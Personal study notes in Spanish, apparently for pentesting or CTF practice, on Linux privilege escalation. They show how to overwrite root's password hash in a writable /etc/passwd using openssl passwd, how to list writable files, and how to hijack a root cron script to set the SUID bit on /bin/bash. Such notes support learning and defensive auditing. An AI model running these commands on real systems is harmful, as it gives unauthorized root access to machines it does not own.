- Si encontramos el `/etc/passwd` con permisos para cambiarlo

```
ls -l /etc/passwd
```
- Para setearlo
```
chmod o+w /etc/passwd
```
- Cuando ingresamos como usuarios `su algo|root|savitar|etc` mira la contrasenia en `/etc/passwd` o en `/etc/shadow`, en ese orden
- Asi configurando el passwd no le vamos a dar tiempo a comparar contrasenias con shadow

- Para crear una contrasenia cifrada
```
openssl passwd
cualquier cosa
```
- Te devuelve un hash
- En el /etc/passwd colocamos la contrasenia en la x en root

```
su root
contrasenia nueva
```

- Esto puede suceder para muchos otros archivos y para encontrarlos:
```
find / -writable 2>/dev/null
```

- Como root tenemos esto: `crontab -e`
```
* * * * * /bin/bash /home/savitar/example.sh 
```
- En el directorio de savitar creamos esto:
```
nano example.sh
chmod +x example.sh
ls -l example.sh

----------------
#!/bin/bash 
whoami > /home/savitar/output.txt
----------------
```

- Como el usuario savitar eliminamos el example de root y creamos uno nuevo con
```
chmod u+s /bin/bash
```

## Herramientas
- [[lse]]

